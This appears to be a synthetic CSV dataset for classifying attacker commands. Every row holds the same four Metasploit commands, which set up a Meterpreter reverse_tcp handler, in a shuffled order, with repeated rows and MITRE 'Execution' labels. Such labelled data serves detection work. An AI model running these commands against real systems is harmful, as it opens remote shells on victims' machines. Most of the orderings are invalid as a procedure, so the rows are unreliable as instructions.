command_list,tool,mitre_stage,intent,category
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"use exploit/multi/handler	 msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run	 msfconsole -q",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 use exploit/multi/handler	 set PAYLOAD windows/meterpreter/reverse_tcp	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"run	 use exploit/multi/handler	 msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"set PAYLOAD windows/meterpreter/reverse_tcp	 msfconsole -q	 run	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler	 run",metasploit,Execution,Exploit vulnerable services,Exploit Execution
"msfconsole -q	 run	 set PAYLOAD windows/meterpreter/reverse_tcp	 use exploit/multi/handler",metasploit,Execution,Exploit vulnerable services,Exploit Execution
